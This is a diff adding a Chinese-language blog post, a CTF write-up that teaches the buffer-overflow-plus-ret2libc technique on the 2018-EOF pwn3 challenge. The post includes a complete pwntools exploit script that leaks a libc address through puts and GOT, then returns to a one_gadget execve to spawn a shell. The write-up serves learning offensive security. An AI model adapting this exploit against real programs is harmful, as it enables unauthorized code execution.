@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>buffer overflow搭配ret2libc之攻擊手法介紹 | Yiyu&#39;s Dev Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta property="og:type" content="article">
+<meta property="og:title" content="buffer overflow搭配ret2libc之攻擊手法介紹">
+<meta property="og:url" content="https://blog.yiyu0x.org/2019/03/02/index.html">
+<meta property="og:site_name" content="Yiyu&#39;s Dev Blog">
+<meta property="og:locale" content="zh_TW">
+<meta property="og:image" content="https://blog.yiyu0x.org/2019/03/02/IDA-F5.png">
+<meta property="og:image" content="https://blog.yiyu0x.org/2019/03/02/IDA-F5.png">
+<meta property="og:image" content="https://blog.yiyu0x.org/2019/03/02/checksec.png">
+<meta property="og:image" content="https://blog.yiyu0x.org/2019/03/02/checksec.png">
+<meta property="og:image" content="https://blog.yiyu0x.org/2019/03/02/one_gadget.png">
+<meta property="og:image" content="https://blog.yiyu0x.org/2019/03/02/one_gadget.png">
+<meta property="article:published_time" content="2019-03-02T05:13:17.000Z">
+<meta property="article:modified_time" content="2025-04-12T20:59:43.588Z">
+<meta property="article:author" content="yiyu0x">
+<meta property="article:tag" content="資訊安全">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.yiyu0x.org/2019/03/02/IDA-F5.png">
+  
+    <link rel="alternate" href="/" title="Yiyu's Dev Blog">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Yiyu&#39;s Dev Blog</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">🏖️</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://blog.yiyu0x.org"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-buffer overflow搭配ret2libc之攻擊手法介紹" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2019/03/02/" class="article-date">
+  <time class="dt-published" datetime="2019-03-02T05:13:17.000Z" itemprop="datePublished">2019-03-02</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      buffer overflow搭配ret2libc之攻擊手法介紹
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <html><head></head><body><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>buffer overflow 以下簡稱為 BOF。</p>
+<p>BOF 是一個常見的攻擊手法，透過 BOF 可以達成各種不同的目的，像是：</p>
+<ul>
+<li>ret2text</li>
+<li>ret2shellcode</li>
+<li>ret2syscall</li>
+<li>ret2libc</li>
+</ul>
+<p>本文將透過 2018-EOF 的 pwn3 來說明 ret2libc 的攻擊手法</p>
+<h2 id="分析題目"><a href="#分析題目" class="headerlink" title="分析題目"></a>分析題目</h2><p>(題目給了一個 ELF 檔案 以及 libc.so.6)</p>
+<p>拿到題目第一步，先丟到 IDA 中逆向</p>
+<!-- <img src="/2019/03/02/IDA-F5.png" class=""> -->
+<p><img src="/2019/03/02/IDA-F5.png" alt="1"></p>
+<p>同時查看 ELF 檔案的保護狀態</p>
+<!-- <img src="/2019/03/02/checksec.png" class=""> -->
+<p><img src="/2019/03/02/checksec.png" alt="2"></p>
+<p>這兩個線索加起來(沒有 canary, 使用 read 函數)，第一個想到的就是 BOF</p>
+<p>但是程式中並沒有現成的 function 可以用，我們的目的是 get shell</p>
+<p>然而在題目給的 libc.so.6 中，發現了 execve</p>
+<!-- <img src="/2019/03/02/one_gadget.png" class=""> -->
+<p><img src="/2019/03/02/one_gadget.png" alt="3"></p>
+<h2 id="困難點"><a href="#困難點" class="headerlink" title="困難點"></a>困難點</h2><p>我們並不知道 libc.so.6 load 進 memory 之後的記憶體位置是多少，只知道 execve 相對於 libc.so.6 的 offset 是多少 (0xf1147)</p>
+<p>但是程式中有一個 puts 函數，如果我們能利用他來印出 GOT 的 main 位置並且與 binary 裡面的 main 位置相減，就知道整個函式庫載入到 memory 的哪個位置了</p>
+<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>先備知識：</p>
+<blockquote>
+<p>Linux x86-64 下的 calling convention</p>
+</blockquote>
+<p>參數少於 7，參數從左到右放入暫存器順序為: rdi, rsi, rdx, rcx, r8, r9</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = flat([</span><br><span class="line">                offset, <span class="comment"># 透過 read 蓋一堆 'a' 直到 ret addr</span></span><br><span class="line">                pop_rdi_ret, <span class="comment"># 設定 puts 的參數，只有一個，所以利用 pop_rdi 即可</span></span><br><span class="line">                elf.got[<span class="string">'__libc_start_main'</span>], <span class="comment"># puts 的參數 1</span></span><br><span class="line">                elf.plt[<span class="string">'puts'</span>], <span class="comment"># 執行 puts</span></span><br><span class="line">                elf.symbols[<span class="string">'main'</span>] <span class="comment"># 執行完 puts 重新執行 main</span></span><br><span class="line">                ])</span><br></pre></td></tr></tbody></table></figure>
+
+<p>如此一來程式的流程就會變成，印出 <code>elf.got['__libc_start_main']</code> 並且重新執行 main</p>
+<p>接著只需要把印出的記憶體位置用 u64 打包並且減去 main 在程式中未載入時的位置就可以得知 load 到 memory 中的位移</p>
+<p>把位移再加上用 one_gadget 找到的 execve 就大工告成了!</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload2 = flat([</span><br><span class="line">                offset,</span><br><span class="line">                u64(r.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>) - libc.symbols[<span class="string">'__libc_start_main'</span>] + one_gadget</span><br><span class="line">])</span><br></pre></td></tr></tbody></table></figure>
+
+<p>以下是完整 payload</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./pwn3'</span>)</span><br><span class="line"><span class="comment">#libc = ELF('libc.so.6') #題目給的</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>) <span class="comment">#本地測試</span></span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">'amd64'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line">r = process(<span class="string">'./pwn3'</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="string">'a'</span>*<span class="number">0x10</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4006d3</span></span><br><span class="line">one_gadget = <span class="number">0xf1147</span></span><br><span class="line"></span><br><span class="line">payload = flat([</span><br><span class="line">                offset,</span><br><span class="line">                pop_rdi_ret,</span><br><span class="line">                elf.got[<span class="string">'__libc_start_main'</span>],</span><br><span class="line">                elf.plt[<span class="string">'puts'</span>],</span><br><span class="line">                elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">                ])</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvline()</span><br><span class="line"></span><br><span class="line">payload2 = flat([</span><br><span class="line">                offset,</span><br><span class="line">                u64(r.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>) - libc.symbols[<span class="string">'__libc_start_main'</span>] + one_gadget</span><br><span class="line">                ])</span><br><span class="line"></span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>
+</body></html>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://blog.yiyu0x.org/2019/03/02/" data-id="cm9es89cb000dshrp4owl5y4m" data-title="buffer overflow搭配ret2libc之攻擊手法介紹" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/" rel="tag">資訊安全</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2019/03/06/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          在ubuntu上將nginx升級至http/2
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/03/01/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">如何看待C語言的argv與指標關係</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/AWS/" rel="tag">AWS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CI-CD/" rel="tag">CI/CD</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DNS/" rel="tag">DNS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Docker/" rel="tag">Docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DroneCI/" rel="tag">DroneCI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/EKS/" rel="tag">EKS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ELB/" rel="tag">ELB</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kubernetes/" rel="tag">Kubernetes</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/" rel="tag">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/c/" rel="tag">c</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cgroup/" rel="tag">cgroup</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/container/" rel="tag">container</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/" rel="tag">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/es6/" rel="tag">es6</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fp/" rel="tag">fp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/http2/" rel="tag">http2</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/javascript/" rel="tag">javascript</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kubernetes/" rel="tag">kubernetes</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/life/" rel="tag">life</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/macOS/" rel="tag">macOS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/macos/" rel="tag">macos</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mysql/" rel="tag">mysql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nginx/" rel="tag">nginx</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nodejs/" rel="tag">nodejs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/oauth2/" rel="tag">oauth2</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/podman/" rel="tag">podman</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/raspberry-pi/" rel="tag">raspberry_pi</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shell/" rel="tag">shell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/socket/" rel="tag">socket</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/telegram/" rel="tag">telegram</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tools/" rel="tag">tools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/traefik/" rel="tag">traefik</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%80%8B%E4%BA%BA/" rel="tag">個人</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/" rel="tag">資訊安全</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/AWS/" style="font-size: 12.5px;">AWS</a> <a href="/tags/CI-CD/" style="font-size: 10px;">CI/CD</a> <a href="/tags/DNS/" style="font-size: 10px;">DNS</a> <a href="/tags/Docker/" style="font-size: 10px;">Docker</a> <a href="/tags/DroneCI/" style="font-size: 10px;">DroneCI</a> <a href="/tags/EKS/" style="font-size: 12.5px;">EKS</a> <a href="/tags/ELB/" style="font-size: 10px;">ELB</a> <a href="/tags/Kubernetes/" style="font-size: 15px;">Kubernetes</a> <a href="/tags/Linux/" style="font-size: 10px;">Linux</a> <a href="/tags/c/" style="font-size: 12.5px;">c</a> <a href="/tags/cgroup/" style="font-size: 10px;">cgroup</a> <a href="/tags/container/" style="font-size: 10px;">container</a> <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/docker/" style="font-size: 17.5px;">docker</a> <a href="/tags/es6/" style="font-size: 15px;">es6</a> <a href="/tags/fp/" style="font-size: 10px;">fp</a> <a href="/tags/http2/" style="font-size: 10px;">http2</a> <a href="/tags/javascript/" style="font-size: 20px;">javascript</a> <a href="/tags/kubernetes/" style="font-size: 20px;">kubernetes</a> <a href="/tags/life/" style="font-size: 10px;">life</a> <a href="/tags/linux/" style="font-size: 12.5px;">linux</a> <a href="/tags/macOS/" style="font-size: 10px;">macOS</a> <a href="/tags/macos/" style="font-size: 15px;">macos</a> <a href="/tags/mysql/" style="font-size: 10px;">mysql</a> <a href="/tags/nginx/" style="font-size: 12.5px;">nginx</a> <a href="/tags/nodejs/" style="font-size: 12.5px;">nodejs</a> <a href="/tags/oauth2/" style="font-size: 10px;">oauth2</a> <a href="/tags/podman/" style="font-size: 10px;">podman</a> <a href="/tags/python/" style="font-size: 12.5px;">python</a> <a href="/tags/raspberry-pi/" style="font-size: 10px;">raspberry_pi</a> <a href="/tags/shell/" style="font-size: 10px;">shell</a> <a href="/tags/socket/" style="font-size: 10px;">socket</a> <a href="/tags/telegram/" style="font-size: 10px;">telegram</a> <a href="/tags/tools/" style="font-size: 12.5px;">tools</a> <a href="/tags/traefik/" style="font-size: 10px;">traefik</a> <a href="/tags/%E5%80%8B%E4%BA%BA/" style="font-size: 15px;">個人</a> <a href="/tags/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/" style="font-size: 15px;">資訊安全</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/04/">四月 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">九月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">八月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">七月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">十二月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">十一月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">五月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">四月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">三月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">一月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">八月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">七月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">四月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">三月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">二月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">一月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">十二月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">十一月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">十月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">九月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">八月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">七月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">六月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">五月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">三月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">二月 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/04/12/">test</a>
+          </li>
+        
+          <li>
+            <a href="/2025/04/12/">2025 Life Update</a>
+          </li>
+        
+          <li>
+            <a href="/2022/09/05/">EKS ELB 獲取 Client IP 方法紀錄</a>
+          </li>
+        
+          <li>
+            <a href="/2022/08/30/">建立 Reliable EKS 記錄</a>
+          </li>
+        
+          <li>
+            <a href="/2022/07/07/">在 macOS 上使用 Podman</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2025 yiyu0x<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
